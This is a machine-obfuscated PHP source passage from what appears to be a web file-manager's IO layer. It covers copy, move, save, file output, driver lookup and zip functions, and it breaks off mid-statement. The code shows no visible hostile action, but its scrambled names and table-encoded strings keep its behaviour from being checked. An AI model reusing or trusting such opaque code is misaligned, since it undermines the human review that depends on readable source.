<?php
 goto fôæ¨Ş¹Ë; dêßÉÚ—¬Ö: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($à©ç§—™, $‹¿¤şµÌ) { $ëãéˆ‚ß =& $_SERVER[”ôÑ§ì¸]; $©Êëü‡– = $‹¿¤şµÌ; $GLOBALS[$ëãéˆ‚ß[1177]] = $ëãéˆ‚ß[1178] . $à©ç§—™; Hook::trigger($ëãéˆ‚ß[1178] . $à©ç§—™ . $ëãéˆ‚ß[1179], $©Êëü‡–); $©¢±Ã•˜ = self::driverMake($‹¿¤şµÌ[0]); if (!$©¢±Ã•˜) { return !1; } if (method_exists($©¢±Ã•˜, $à©ç§—™)) { $Ì³ŞÚÇÊ = @call_user_func_array(array($©¢±Ã•˜, $à©ç§—™), $‹¿¤şµÌ); } else { if (method_exists($©¢±Ã•˜, $ëãéˆ‚ß[1180])) { $Ì³ŞÚÇÊ = @call_user_func_array(array($©¢±Ã•˜, $à©ç§—™), $‹¿¤şµÌ); } else { if (method_exists(self, $à©ç§—™)) { $Ì³ŞÚÇÊ = @call_user_func_array(array(self, $à©ç§—™), $‹¿¤şµÌ); } else { $Ì³ŞÚÇÊ = call_user_func_array(array(parent, $à©ç§—™), $‹¿¤şµÌ); } } } Hook::trigger($ëãéˆ‚ß[1178] . $à©ç§—™ . $ëãéˆ‚ß[1181], $©Êëü‡–, $Ì³ŞÚÇÊ); return $Ì³ŞÚÇÊ; } public static function init($ÉäµÂˆ‘) { return self::driverMake($ÉäµÂˆ‘); } public static function copy($±¬µšË², $¤¢¯Ì¶ô, $‹¢Òû»é = false, $ß‹ÇèÖğ = false) { return self::copyMoveStart($±¬µšË², $¤¢¯Ì¶ô, $‹¢Òû»é, $_SERVER[”ôÑ§ì¸][585], $ß‹ÇèÖğ); } public static function move($à¡ÏĞÃ, $ËÈÂÑ®¶, $¼öÍ¦îï = false, $ŸŠ£ÒÉá = false) { return self::copyMoveStart($à¡ÏĞÃ, $ËÈÂÑ®¶, $¼öÍ¦îï, $_SERVER[”ôÑ§ì¸][587], $ŸŠ£ÒÉá); } private static function copyMoveStart($ß§™¤ÚÚ, $ôéÚùó, $„»Ş¸»§, $ÌæÄª€¬, $¿îÃ ‚È) { $  ¨ôäê =& $_SERVER[”ôÑ§ì¸]; $‰´´ˆ°Ë = array($ß§™¤ÚÚ, $ôéÚùó, $„»Ş¸»§, $¿îÃ ‚È); Hook::trigger($  ¨ôäê[1178] . $ÌæÄª€¬ . $  ¨ôäê[1179], $‰´´ˆ°Ë); $ğ±•Îüï = self::copyMove($ß§™¤ÚÚ, $ôéÚùó, $„»Ş¸»§, $ÌæÄª€¬, $¿îÃ ‚È); Hook::trigger($  ¨ôäê[1178] . $ÌæÄª€¬ . $  ¨ôäê[1181], $‰´´ˆ°Ë, $ğ±•Îüï); return $ğ±•Îüï; } public static function saveFile($×Ü¦ËÕ¡, $°ïŸÔÎú, $§œØ¾»¾ = true) { $‘¨›ôÒ® =& $_SERVER[”ôÑ§ì¸]; $ÅØèŞ¡Â = self::info($°ïŸÔÎú); $¿…¹˜Ïñ = self::driverMake($×Ü¦ËÕ¡); $¦”âêÑñ = self::driverMake($°ïŸÔÎú); $ä½ê‰íÅ = !1; if ($¦”âêÑñ->pathParse[$‘¨›ôÒ®[1182]]) { $ä½ê‰íÅ = $¦”âêÑñ; $ÙƒÅ–ş“ = $¦”âêÑñ->pathParse[$‘¨›ôÒ®[1182]]; $¦”âêÑñ = self::driverMake($ÙƒÅ–ş“); } if ($¿…¹˜Ïñ->pathParse[$‘¨›ôÒ®[1182]]) { $¹–İÛÙ¹ = $¿…¹˜Ïñ->pathParse[$‘¨›ôÒ®[1182]]; $¿…¹˜Ïñ = self::driverMake($¹–İÛÙ¹); } $¡šïÑÑõ = $¦”âêÑñ->pathFather($°ïŸÔÎú); $íôİ³Ê = !0; if (!$§œØ¾»¾ && self::driverIsSame($¿…¹˜Ïñ, $¦”âêÑñ)) { $íôİ³Ê = !1; } $€€àˆæÒ = self::copyFile($¿…¹˜Ïñ, $×Ü¦ËÕ¡, $¦”âêÑñ, $¡šïÑÑõ, $ÅØèŞ¡Â[$‘¨›ôÒ®[32]], $íôİ³Ê); if ($ä½ê‰íÅ) { $€€àˆæÒ = $ä½ê‰íÅ->getPathOuter($€€àˆæÒ); } return $€€àˆæÒ; } private static function copyMove($ ‚«³™, $å¶Û‚ó, $£¿Ä†ŒË, $¡œóäÊĞ, $¨¶ÕÅĞ° = false) { $£Şš¿ =& $_SERVER[”ôÑ§ì¸]; if (!$ ‚«³™ || $ ‚«³™ == $£Şš¿[8] || !$å¶Û‚ó) { return !1; } ignore_timeout(); $¶êóö¾ = self::driverMake($ ‚«³™); $Á®‰€•€ = self::driverMake($å¶Û‚ó); $Ï•¹–ĞÜ = $¡œóäÊĞ == $£Şš¿[587]; $øˆÑ„îˆ = !1; if ($Á®‰€•€->pathParse[$£Şš¿[1182]]) { $øˆÑ„îˆ = $Á®‰€•€; $å¶Û‚ó = $Á®‰€•€->pathParse[$£Şš¿[1182]]; $Á®‰€•€ = self::driverMake($å¶Û‚ó); } if ($¶êóö¾->pathParse[$£Şš¿[1182]]) { $ ‚«³™ = $¶êóö¾->pathParse[$£Şš¿[1182]]; $¶êóö¾ = self::driverMake($ ‚«³™); } self::check($¶êóö¾, $ ‚«³™, $Á®‰€•€, $å¶Û‚ó); Hook::trigger($£Şš¿[1183], $¶êóö¾, $ ‚«³™, $Á®‰€•€, $å¶Û‚ó); $×›Ì’…Ê = self::driverIsSame($¶êóö¾, $Á®‰€•€); if ($×›Ì’…Ê) { if ($¡œóäÊĞ == $£Şš¿[587] && !method_exists($Á®‰€•€, $£Şš¿[1184]) && trim($å¶Û‚ó, $£Şš¿[8]) == trim($Á®‰€•€->pathFather($ ‚«³™), $£Şš¿[8])) { if ($¶êóö¾->pathThis($ ‚«³™) != $¨¶ÕÅĞ° && !$¶êóö¾->isTypeObject()) { return $¶êóö¾->rename($ ‚«³™, $¨¶ÕÅĞ°); } return $Á®‰€•€->getPathOuter($ ‚«³™); } if (method_exists($Á®‰€•€, $¡œóäÊĞ)) { return $Á®‰€•€->{$¡œóäÊĞ}($ ‚«³™, $å¶Û‚ó, $£¿Ä†ŒË, $¨¶ÕÅĞ°); } } if ($×›Ì’…Ê && $¡œóäÊĞ == $£Şš¿[587] && $Á®‰€•€->getType() == $£Şš¿[106]) { $¡»ŒóºÉ = $Á®‰€•€->movePath($ ‚«³™, $å¶Û‚ó, $¨¶ÕÅĞ°); if ($¡»ŒóºÉ) { return $¡»ŒóºÉ; } } $†›æ‡´ = $¶êóö¾->isFile($ ‚«³™); if (!$†›æ‡´ && $Á®‰€•€->getType() == $£Şš¿[779] && $¶êóö¾->getType() == $£Şš¿[106]) { $¡»ŒóºÉ = $Á®‰€•€->copyFolderFromIO($¶êóö¾, $ ‚«³™, $å¶Û‚ó, $£¿Ä†ŒË, $Ï•¹–ĞÜ, $¨¶ÕÅĞ°); } else { $¡»ŒóºÉ = self::copyPath($¶êóö¾, $ ‚«³™, $Á®‰€•€, $å¶Û‚ó, $£¿Ä†ŒË, $Ï•¹–ĞÜ, $†›æ‡´, $¨¶ÕÅĞ°); } if ($¡»ŒóºÉ && $Ï•¹–ĞÜ) { $¶êóö¾->remove($ ‚«³™); } if ($øˆÑ„îˆ) { $¡»ŒóºÉ = $øˆÑ„îˆ->getPathOuter($¡»ŒóºÉ); } return $¡»ŒóºÉ; } private static function check($ô×«Î‹, $ğÙ­øÒ¸, $û­Ùø¬°, &$­å‚«¸æ) { $—ÁªÒ–â =& $_SERVER[”ôÑ§ì¸]; if (self::driverIsSame($ô×«Î‹, $û­Ùø¬°) && $ô×«Î‹->isFolder($ğÙ­øÒ¸) && $ô×«Î‹->isParentOf($ğÙ­øÒ¸, $­å‚«¸æ)) { show_json(LNG($—ÁªÒ–â[1185]), !1); } if (!$ô×«Î‹->exist($ğÙ­øÒ¸)) { show_json(LNG($—ÁªÒ–â[105]), !1); } } private static function copyPath($Å ê¹ãÎ, $ØÜ÷¢ëÍ, $ôñĞÉ–¥, $ŞÄÓœ€•, $ñ¨Ø…¶•, $èÎ€üÌ¼, $‚Ô­„ú, $…¤÷ãÄ = false, $©Ù´¹±² = true) { $§ìÃµ…Ï =& $_SERVER[”ôÑ§ì¸]; $Ê¦®ˆÙ = empty($…¤÷ãÄ) && $…¤÷ãÄ !== $§ìÃµ…Ï[211] ? $Å ê¹ãÎ->pathThis($ØÜ÷¢ëÍ) : $…¤÷ãÄ; if ($ñ¨Ø…¶•) { $‡–«Œ– = $ôñĞÉ–¥->fileNameExist($ŞÄÓœ€•, $Ê¦®ˆÙ); $‚‘“×«— = $Ê¦®ˆÙ; $Ê¦®ˆÙ = $ôñĞÉ–¥->fileNameAuto($ŞÄÓœ€•, $Ê¦®ˆÙ, $ñ¨Ø…¶•, !$‚Ô­„ú); if (!$‡–«Œ– || $‚‘“×«— != $Ê¦®ˆÙ) { $ñ¨Ø…¶• = !1; } if ($©Ù´¹±² && !$ñ¨Ø…¶•) { $ôñĞÉ–¥->_data[$§ìÃµ…Ï[1186]] = !0; } } if ($‚Ô­„ú) { return self::copyFile($Å ê¹ãÎ, $ØÜ÷¢ëÍ, $ôñĞÉ–¥, $ŞÄÓœ€•, $Ê¦®ˆÙ, $èÎ€üÌ¼); } if ($ñ¨Ø…¶• == REPEAT_RENAME_FOLDER) { $ñ¨Ø…¶• = !1; } $ˆ´Šõââ = rtrim($ŞÄÓœ€•, $§ìÃµ…Ï[8]) . $§ìÃµ…Ï[8] . $Ê¦®ˆÙ; $Ò±¾÷Ã = $ôñĞÉ–¥->mkdir($ôñĞÉ–¥->getPath($ˆ´Šõââ), $ñ¨Ø…¶•); $ŞÄÓœ€• = $ôñĞÉ–¥->getPathInner($Ò±¾÷Ã); $ëä¼º¿ = $Å ê¹ãÎ->listPath($ØÜ÷¢ëÍ, !0); $ëä¼º¿ = is_array($ëä¼º¿) ? $ëä¼º¿ : array($§ìÃµ…Ï[83] => array(), $§ìÃµ…Ï[82] => array()); $é°×â® = array_merge($ëä¼º¿[$§ìÃµ…Ï[83]], $ëä¼º¿[$§ìÃµ…Ï[82]]); foreach ($é°×â® as $šƒ«Ø) { $×‚¹îäõ = $šƒ«Ø[$§ìÃµ…Ï[33]] == $§ìÃµ…Ï[213]; $ØÜ÷¢ëÍ = $Å ê¹ãÎ->getPathInner($šƒ«Ø[$§ìÃµ…Ï[84]]); $Î¨¸Ó¶‹ = self::copyPath($Å ê¹ãÎ, $ØÜ÷¢ëÍ, $ôñĞÉ–¥, $ŞÄÓœ€•, $ñ¨Ø…¶•, $èÎ€üÌ¼, $×‚¹îäõ, !1, !1); if (!$Î¨¸Ó¶‹) { IO::errorTips($§ìÃµ…Ï[1187] . $ØÜ÷¢ëÍ . $§ìÃµ…Ï[70] . $ŞÄÓœ€•); } } self::copyMoveKeepInfo($Å ê¹ãÎ, $ØÜ÷¢ëÍ, $Ò±¾÷Ã); return $Ò±¾÷Ã; } private static function copyFile($æ‹Ó›Úæ, $÷²í“‡ä, $¶Ö“¸æå, $üÎÈÍã‚, $ãµà»€é, $îï®ÄÆ) { $èçõ¥¿î =& $_SERVER[”ôÑ§ì¸]; $üÎÈÍã‚ = $¶Ö“¸æå->getPath(rtrim($üÎÈÍã‚, $èçõ¥¿î[8]) . $èçõ¥¿î[8] . $ãµà»€é); $°ã°á©  = $èçõ¥¿î[1188] . time() . rand_string(5); Hook::trigger($èçõ¥¿î[1189], $æ‹Ó›Úæ, $÷²í“‡ä, $¶Ö“¸æå, $üÎÈÍã‚, $ãµà»€é, $°ã°á© ); if (self::driverIsSame($æ‹Ó›Úæ, $¶Ö“¸æå)) { if ($îï®ÄÆ) { $­ôã„àö = $¶Ö“¸æå->moveFile($÷²í“‡ä, $üÎÈÍã‚); } else { $­ôã„àö = $¶Ö“¸æå->copyFile($÷²í“‡ä, $üÎÈÍã‚); } Hook::trigger($èçõ¥¿î[1190], $æ‹Ó›Úæ, $÷²í“‡ä, $¶Ö“¸æå, $üÎÈÍã‚, $ãµà»€é, $­ôã„àö); self::copyMoveKeepInfo($æ‹Ó›Úæ, $÷²í“‡ä, $­ôã„àö); return $­ôã„àö; } $Ç‚ç­Øà = TEMP_FILES; if ($GLOBALS[$èçõ¥¿î[6]][$èçõ¥¿î[89]][$èçõ¥¿î[818]]) { $Ç‚ç­Øà = $GLOBALS[$èçõ¥¿î[6]][$èçõ¥¿î[89]][$èçõ¥¿î[818]]; } $Ûê„“ü = $Ç‚ç­Øà; mk_dir($Ûê„“ü); $¯Ù¶‚š“ = $Ûê„“ü . $°ã°á© ; $  ºüœÛ = $¯Ù¶‚š“; $¯Ù¶‚š“ = $æ‹Ó›Úæ->download($÷²í“‡ä, $¯Ù¶‚š“); $¯Ù¶‚š“ = $æ‹Ó›Úæ->iconvApp($¯Ù¶‚š“); if (substr($¯Ù¶‚š“, strlen($Ç‚ç­Øà)) == $Ç‚ç­Øà) { $îï®ÄÆ = !0; } $­ôã„àö = $¶Ö“¸æå->upload($üÎÈÍã‚, $¯Ù¶‚š“, $îï®ÄÆ); self::remove($  ºüœÛ); Hook::trigger($èçõ¥¿î[1190], $æ‹Ó›Úæ, $÷²í“‡ä, $¶Ö“¸æå, $üÎÈÍã‚, $ãµà»€é, $­ôã„àö); self::copyMoveKeepInfo($æ‹Ó›Úæ, $÷²í“‡ä, $­ôã„àö); return $­ôã„àö; } private static function copyMoveKeepInfo($“”ÄÂÔÄ, $õŸ©ÌÑ, $ØµœœÖş) { if (!$ØµœœÖş) { return; } $ÁˆêÌëï = $“”ÄÂÔÄ->info($õŸ©ÌÑ); if (!is_array($ÁˆêÌëï)) { return; } IO::setModifyTime($ØµœœÖş, $ÁˆêÌëï[$_SERVER[”ôÑ§ì¸][85]]); } public static function pathFather($úÔ¢´£é) { $ÚôÄ³šâ = IO::init($úÔ¢´£é); $Ãú¦ß— = $ÚôÄ³šâ->pathFather($ÚôÄ³šâ->path); return $ÚôÄ³šâ->getPathOuter($Ãú¦ß—); } public static function fileOut($İ¡Ğ¶ˆ½, $˜ôĞ¡§â = false, $™ıŞ©ÂÖ = false, $™ÍÊà‹õ = '') { $‘ĞÔúš« = self::driverMake($İ¡Ğ¶ˆ½); if ($‘ĞÔúš«->isFileOutServer()) { return $‘ĞÔúš«->fileOutServer($İ¡Ğ¶ˆ½, $˜ôĞ¡§â, $™ıŞ©ÂÖ, $™ÍÊà‹õ); } return $‘ĞÔúš«->fileOut($İ¡Ğ¶ˆ½, $˜ôĞ¡§â, $™ıŞ©ÂÖ, $™ÍÊà‹õ); } public static function fileOutImage($û§ÁŒ£ô, $Û‘¥£ğñ = 250) { $“Ÿ–ßâ = array(250, 600, 1200, 2000, 3000, 5000); for ($‘Åìˆ…á = 0; $‘Åìˆ…á < count($“Ÿ–ßâ); $‘Åìˆ…á++) { if ($‘Åìˆ…á == 0 && $Û‘¥£ğñ <= $“Ÿ–ßâ[$‘Åìˆ…á]) { $Û‘¥£ğñ = $“Ÿ–ßâ[$‘Åìˆ…á]; break; } else { if ($Û‘¥£ğñ > $“Ÿ–ßâ[$‘Åìˆ…á - 1] && $Û‘¥£ğñ <= $“Ÿ–ßâ[$‘Åìˆ…á]) { $Û‘¥£ğñ = $“Ÿ–ßâ[$‘Åìˆ…á]; break; } else { if ($‘Åìˆ…á == count($“Ÿ–ßâ) - 1 && $Û‘¥£ğñ > $“Ÿ–ßâ[$‘Åìˆ…á]) { $Û‘¥£ğñ = $“Ÿ–ßâ[$‘Åìˆ…á]; break; } } } } $Ò¿Ç¼ğ‹ = self::driverMake($û§ÁŒ£ô); if ($Ò¿Ç¼ğ‹->isFileOutServer()) { return $Ò¿Ç¼ğ‹->fileOutImageServer($û§ÁŒ£ô, $Û‘¥£ğñ); } return $Ò¿Ç¼ğ‹->fileOutImage($û§ÁŒ£ô, $Û‘¥£ğñ); } private static function driverIsSame($¢ÜˆĞ­¾, $€šãÎ– ) { $ÊÈê£¡Ú =& $_SERVER[”ôÑ§ì¸]; $¼İ’™ï„ = $¢ÜˆĞ­¾->getType(); $Ë¾¬Àì¨ = $€šãÎ– ->getType(); if ($¼İ’™ï„ != $Ë¾¬Àì¨) { return !1; } if ($¼İ’™ï„ == $ÊÈê£¡Ú[779]) { return !0; } if ($¼İ’™ï„ == $ÊÈê£¡Ú[106]) { return !0; } if ($¢ÜˆĞ­¾->pathDriver == $€šãÎ– ->pathDriver) { return !0; } return !1; } public static function copyUpdate($¿ø‘‹Ö, $ò‹Äİüß) { $Šı»Ï× =& $_SERVER[”ôÑ§ì¸]; if (!IO::exist($¿ø‘‹Ö)) { return !1; } if (!IO::exist($ò‹Äİüß)) { IO::mkdir($ò‹Äİüß); } $®’ÏÕŸÑ = array_to_keyvalue(self::listAllSimple($¿ø‘‹Ö), $Šı»Ï×[84]); $á°ÀÒŠ = array_to_keyvalue(self::listAllSimple($ò‹Äİüß), $Šı»Ï×[84]); $İÓ†“Ôß = array(); $óàãŸÀã = array(); foreach ($®’ÏÕŸÑ as $™˜–Õší => $Ş²¤‰ÏŒ) { if (isset($á°ÀÒŠ[$™˜–Õší])) { if ($Ş²¤‰ÏŒ[$Šı»Ï×[75]] == 1) { continue; } if ($á°ÀÒŠ[$™˜–Õší][$Šı»Ï×[76]] == $Ş²¤‰ÏŒ[$Šı»Ï×[76]]) { continue; } } if ($Ş²¤‰ÏŒ[$Šı»Ï×[75]] == 1) { $óàãŸÀã[] = $ò‹Äİüß . $Šı»Ï×[8] . trim($™˜–Õší, $Šı»Ï×[8]); continue; } $Ó†ËññÖ = strstr(trim($™˜–Õší, $Šı»Ï×[8]), $Šı»Ï×[8]) ? get_path_father($™˜–Õší) : $Šı»Ï×[12]; $İÓ†“Ôß[] = array($Šı»Ï×[1191] => $Ş²¤‰ÏŒ[$Šı»Ï×[86]], $Šı»Ï×[1192] => rtrim($ò‹Äİüß, $Šı»Ï×[8]) . $Šı»Ï×[8] . $Ó†ËññÖ, $Šı»Ï×[1193] => $Ş²¤‰ÏŒ); } $‘ˆ¥ë–î = array($Šı»Ï×[213] => $İÓ†“Ôß, $Šı»Ï×[75] => $óàãŸÀã); Hook::trigger($Šı»Ï×[1194], $¿ø‘‹Ö, $ò‹Äİüß, $‘ˆ¥ë–î); foreach ($óàãŸÀã as $Ş²¤‰ÏŒ) { IO::mkdir($Ş²¤‰ÏŒ); } foreach ($İÓ†“Ôß as $Ş²¤‰ÏŒ) { IO::copy($Ş²¤‰ÏŒ[$Šı»Ï×[1191]], $Ş²¤‰ÏŒ[$Šı»Ï×[1192]], REPEAT_REPLACE); } } public static function fileSubstr($ß«ó™Öà, $¡³¥¬½‹, $ÑúÆÃıÄ = false) { $Î¾ÍªÁÌ =& $_SERVER[”ôÑ§ì¸]; $Š˜ÕÉÜ = self::driverMake($ß«ó™Öà); $å²¢Õ¯˜ = $Š˜ÕÉÜ->size($ß«ó™Öà); $ÍÒë¼¦ = $¡³¥¬½‹; $›âÉä› = $ÑúÆÃıÄ; if ($¡³¥¬½‹ < 0) { $¡³¥¬½‹ = $å²¢Õ¯˜ + $¡³¥¬½‹; } if ($ÑúÆÃıÄ === !1) { $ÑúÆÃıÄ = $å²¢Õ¯˜ - $¡³¥¬½‹; } if ($¡³¥¬½‹ + $ÑúÆÃıÄ > $å²¢Õ¯˜) { $ÑúÆÃıÄ = $å²¢Õ¯˜ - $¡³¥¬½‹; } if (!$å²¢Õ¯˜ && $Š˜ÕÉÜ->getType() == $Î¾ÍªÁÌ[106] && !$Š˜ÕÉÜ->exist($ß«ó™Öà)) { $ÙâóÒÀÛ = get_path_this($ß«ó™Öà); $‰À¢­Åè = parse_url_query($ÙâóÒÀÛ); if (is_array($‰À¢­Åè) && isset($‰À¢­Åè[$Î¾ÍªÁÌ[32]])) { $ÙâóÒÀÛ = urldecode($‰À¢­Åè[$Î¾ÍªÁÌ[32]]); } throw new Exception($Î¾ÍªÁÌ[1195] . LNG($Î¾ÍªÁÌ[1196]) . $Î¾ÍªÁÌ[997] . clear_html($ÙâóÒÀÛ) . $Î¾ÍªÁÌ[12]); } if ($ÑúÆÃıÄ <= 0) { return $Î¾ÍªÁÌ[12]; } if ($¡³¥¬½‹ < 0 || $¡³¥¬½‹ >= $å²¢Õ¯˜ || $ÑúÆÃıÄ > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\x65\x52\145\141\144\40\x65\162\x72\x6f\x72\41\40\x73\x74\141\x72\x74\75{$¡³¥¬½‹}\x3b\x6c\x65\156\147\164\150\75{$ÑúÆÃıÄ}\x3b\40\163\x69\172\x65\75{$å²¢Õ¯˜}\73"); } $’÷¤¡ø = $Š˜ÕÉÜ->fileSubstr($ß«ó™Öà, $¡³¥¬½‹, $ÑúÆÃıÄ); if (!$’÷¤¡ø && $ÑúÆÃıÄ && isset($GLOBALS[$Î¾ÍªÁÌ[1197]])) { throw new Exception($GLOBALS[$Î¾ÍªÁÌ[1197]][$Î¾ÍªÁÌ[1198]]); } return $’÷¤¡ø; } private static function driverMake(&$¸ø¶³Ğ) { $âÆÅàÃİ =& $_SERVER[”ôÑ§ì¸]; $ôº¹Ì‡ù = KodIO::parse($¸ø¶³Ğ); if (!self::$driverListSystem) { $ ›Áš¼» = Model($âÆÅàÃİ[789])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ ›Áš¼», $âÆÅàÃİ[442]); } if ($ôº¹Ì‡ù[$âÆÅàÃİ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ôº¹Ì‡ù[$âÆÅàÃİ[442]]]) { return !1; } $¸ø¶³Ğ = $ôº¹Ì‡ù[$âÆÅàÃİ[1199]]; $‚«ÆİãÔ = self::driverGet($ôº¹Ì‡ù, $¸ø¶³Ğ); return $‚«ÆİãÔ; } private static function driverGet($·šƒ¶«, &$ÆÂğŸ½¼) { $Şäİì±­ =& $_SERVER[”ôÑ§ì¸]; $¤à…À§ç = $·šƒ¶«[$Şäİì±­[1200]]; $‡èîùó = $·šƒ¶«[$Şäİì±­[442]]; switch ($·šƒ¶«[$Şäİì±­[33]]) { case KodIO::KOD_IO: $ü¥ ßÙÌ = self::$driverListSystem[$‡èîùó]; break; case KodIO::KOD_SOURCE: $ÆÂğŸ½¼ = $‡èîùó . $ÆÂğŸ½¼; $ü¥ ßÙÌ = array($Şäİì±­[1201] => $Şäİì±­[1202], $Şäİì±­[6] => $·šƒ¶«); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $»ôÒ—¨ä = $GLOBALS[$Şäİì±­[1203]]; self::$driverListUser = array_to_keyvalue($»ôÒ—¨ä, $Şäİì±­[442]); } $ü¥ ßÙÌ = self::$driverListUser[$‡èîùó]; break; case KodIO::KOD_SHARE_LINK: $ü¥ ßÙÌ = array($Şäİì±­[1201] => $Şäİì±­[1204], $Şäİì±­[6] => $·šƒ¶«); $¨­òâ³Ä = Action($Şäİì±­[1205])->sharePathInfo($·šƒ¶«[$Şäİì±­[84]]); $ÆÂğŸ½¼ = $¨­òâ³Ä[$Şäİì±­[180]]; if (!$¨­òâ³Ä[$Şäİì±­[180]]) { $ò’üıÓò = Model($Şäİì±­[631])->getInfo($¨­òâ³Ä[$Şäİì±­[632]]); $ÆÂğŸ½¼ = KodIO::clear($ò’üıÓò[$Şäİì±­[1206]] . $·šƒ¶«[$Şäİì±­[1199]]); $·šƒ¶«[$Şäİì±­[527]] = $ò’üıÓò; $·šƒ¶«[$Şäİì±­[1182]] = $ÆÂğŸ½¼; $ü¥ ßÙÌ = array($Şäİì±­[1201] => $Şäİì±­[1207], $Şäİì±­[6] => $·šƒ¶«); } break; case KodIO::KOD_SHARE_ITEM: $ü¥ ßÙÌ = array($Şäİì±­[1201] => $Şäİì±­[1208], $Şäİì±­[6] => $·šƒ¶«); $ò’üıÓò = Model($Şäİì±­[631])->getInfo($·šƒ¶«[$Şäİì±­[442]]); if ($ò’üıÓò[$Şäİì±­[180]] == $Şäİì±­[211]) { $ÆÂğŸ½¼ = KodIO::clear($ò’üıÓò[$Şäİì±­[1206]] . $·šƒ¶«[$Şäİì±­[1199]]); $·šƒ¶«[$Şäİì±­[527]] = $ò’üıÓò; $·šƒ¶«[$Şäİì±­[1182]] = $ÆÂğŸ½¼; $ü¥ ßÙÌ = array($Şäİì±­[1201] => $Şäİì±­[1209], $Şäİì±­[6] => $·šƒ¶«); } else { if (!$ÆÂğŸ½¼) { $ÆÂğŸ½¼ = $ò’üıÓò[$Şäİì±­[180]]; } } break; default: $ÆÂğŸ½¼ = $·šƒ¶«[$Şäİì±­[84]]; $ü¥ ßÙÌ = array($Şäİì±­[1201] => $Şäİì±­[1210]); break; } $¶¨¡åçØ = $·šƒ¶«[$Şäİì±­[84]]; if (!isset(self::$driverCache[$¶¨¡åçØ])) { $™“š÷ñ‚ = strtolower($ü¥ ßÙÌ[$Şäİì±­[95]]); $ˆ²±Š€¤ = $GLOBALS[$Şäİì±­[6]][$Şäİì±­[89]][$Şäİì±­[848]]; $öÌ˜¿…ƒ = $Şäİì±­[74] . (isset($ˆ²±Š€¤[$™“š÷ñ‚]) ? $ˆ²±Š€¤[$™“š÷ñ‚] : ucfirst($™“š÷ñ‚)); if (!class_exists($öÌ˜¿…ƒ)) { show_json("{$öÌ˜¿…ƒ}\40\x6e\157\164\x20\145\170\151\163\164\163\41", !1); } $³Ş²Ò€Ó = isset($ü¥ ßÙÌ[$Şäİì±­[6]]) ? $ü¥ ßÙÌ[$Şäİì±­[6]] : !1; self::$driverCache[$¶¨¡åçØ] = new $öÌ˜¿…ƒ($³Ş²Ò€Ó); } $™¹÷÷ìü = self::$driverCache[$¶¨¡åçØ]; $™¹÷÷ìü->pathDriver = $¤à…À§ç; $™¹÷÷ìü->pathBase = $Şäİì±­[12]; if (isset($ü¥ ßÙÌ[$Şäİì±­[6]][$Şäİì±­[1211]])) { $™¹÷÷ìü->pathBase = rtrim($ü¥ ßÙÌ[$Şäİì±­[6]][$Şäİì±­[1211]], $Şäİì±­[8]) . $Şäİì±­[8]; $ÆÂğŸ½¼ = $™¹÷÷ìü->pathBase . ltrim($ÆÂğŸ½¼, $Şäİì±­[8]); } $ÆÂğŸ½¼ = $™¹÷÷ìü->getPath($ÆÂğŸ½¼); if (isset($·šƒ¶«[$Şäİì±­[1182]])) { $ÆÂğŸ½¼ = $·šƒ¶«[$Şäİì±­[1182]]; } $™¹÷÷ìü->path = $ÆÂğŸ½¼; return $™¹÷÷ìü; } public static function errorTips($äèˆŠË = false) { $¡¥Š–»© =& $_SERVER[”ôÑ§ì¸]; static $Ù‡›‹ñ = array(); $òĞä®óŠ = 1000; if ($äèˆŠË === -1) { return $Ù‡›‹ñ ? $Ù‡›‹ñ[count($Ù‡›‹ñ) - 1] : $¡¥Š–»©[12]; } if ($äèˆŠË === !1) { return implode($¡¥Š–»©[245], $Ù‡›‹ñ); } if (count($Ù‡›‹ñ) >= $òĞä®óŠ) { $Ù‡›‹ñ = array_slice($Ù‡›‹ñ, $òĞä®óŠ * 0.5, $òĞä®óŠ); } $Ù‡›‹ñ[] = $äèˆŠË; write_log($¡¥Š–»©[162] . ACTION . $¡¥Š–»©[1212] . $äèˆŠË, $¡¥Š–»©[1213]); } public static function getLastError($®ŸÍ„é½ = '') { $«ÊÄ“¤¢ = self::errorTips(-1); return $«ÊÄ“¤¢ ? $«ÊÄ“¤¢ : $®ŸÍ„é½; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¯¡ŞÜÑ£; if ($¯¡ŞÜÑ£) { return $¯¡ŞÜÑ£; } $ŠÉ´ñ´Ì = IO::init($_SERVER[”ôÑ§ì¸][8]); return $ŠÉ´ñ´Ì; } private static function iconvSystem($›Õà¸¦) { return self::local()->iconvSystem($›Õà¸¦); } private static function iconvApp($û€û„¹ø) { return self::local()->iconvApp($û€û„¹ø); } public static function zipFolder($·Ã½í¯¾, $çõíÆª = "\172\x69\x70", $ãĞÓœÔÑ = '', $³èÜ•ûÒ = REPEAT_RENAME) { $áá°Î™ì =& $_SERVER[”ôÑ§ì¸]; $¸¨­›ŒĞ = IO::listPath($·Ã½í¯¾); if (!$¸¨­›ŒĞ) { return !1; } $¸¨­›ŒĞ = array_merge($¸¨­›ŒĞ[$áá°Î™ì[82]], $¸¨­›ŒĞ[$áá°Î™ì[83]]); return self::zip($¸¨­›ŒĞ, $çõíÆª, $ãĞÓœÔÑ, $³èÜ•ûÒ); } public static function zip($ÕëìØ­ˆ, $÷ÕÁÂİè = "\x7a\x69\x70", $¢»ÔºÎ = '', $¯ˆ÷á€¨ = REPEAT_RENAME) { $éß—¤şÌ =& $_SERVER[”ôÑ§ì¸]; if (is_string($ÕëìØ­ˆ) && $ÕëìØ­ˆ) { $ÕëìØ­ˆ = array(array($éß—¤şÌ[84] => $ÕëìØ­ˆ)); } $¬ß—Ëí = self::init($ÕëìØ­ˆ[0][$éß—¤şÌ[84]]); $±Ç¼Çï¨ = self::info($ÕëìØ­ˆ[0][$éß—¤şÌ[84]]); $ÚÙÑ–Ï¼ = $éß—¤şÌ[12]; $ã­¶µĞÔ = $éß—¤şÌ[12]; $Û—»èØ = $éß—¤şÌ[12]; if ($¢»ÔºÎ && substr($¢»ÔºÎ, -1, 1) != $éß—¤şÌ[8]) { $ã­¶µĞÔ = get_path_father($¢»ÔºÎ); $Û—»èØ = get_path_this($¢»ÔºÎ); } else { $ã­¶µĞÔ = self::pathFather($±Ç¼Çï¨[$éß—¤şÌ[84]]); $Û—»èØ = $±Ç¼Çï¨[$éß—¤şÌ[32]] . $éß—¤şÌ[10] . $÷ÕÁÂİè; if 